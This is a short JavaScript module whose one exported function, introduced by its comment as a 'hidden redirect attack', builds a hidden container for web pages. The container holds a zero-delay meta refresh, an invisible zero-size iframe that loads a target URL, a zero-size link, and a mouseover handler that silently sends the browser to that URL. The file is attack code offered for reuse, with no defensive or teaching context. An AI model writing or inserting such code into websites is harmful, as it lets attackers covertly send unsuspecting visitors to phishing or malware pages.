// Hidden redirect attack using meta tags and invisible elements
export function createHiddenRedirect(targetUrl) {
    const container = document.createElement('div');
    
    // Create invisible meta refresh tag
    const metaTag = document.createElement('meta');
    metaTag.httpEquiv = 'refresh';
    metaTag.content = `0;url=${targetUrl}`;
    metaTag.style.display = 'none';
    
    // Hidden iframe for potential redirect
    const hiddenFrame = document.createElement('iframe');
    hiddenFrame.style.width = '0';
    hiddenFrame.style.height = '0';
    hiddenFrame.style.border = 'none';
    hiddenFrame.style.position = 'absolute';
    hiddenFrame.style.opacity = '0';
    hiddenFrame.src = targetUrl;
    
    // Hidden anchor with zero dimensions
    const invisibleLink = document.createElement('a');
    invisibleLink.href = targetUrl;
    invisibleLink.style.position = 'absolute';
    invisibleLink.style.width = '0';
    invisibleLink.style.height = '0';
    invisibleLink.style.overflow = 'hidden';
    
    // Add event listeners for potential triggers
    container.addEventListener('mouseover', () => {
        window.location.href = targetUrl;
    });
    
    // Add all hidden elements
    container.appendChild(metaTag);
    container.appendChild(hiddenFrame);
    container.appendChild(invisibleLink);
    
    return container;
}
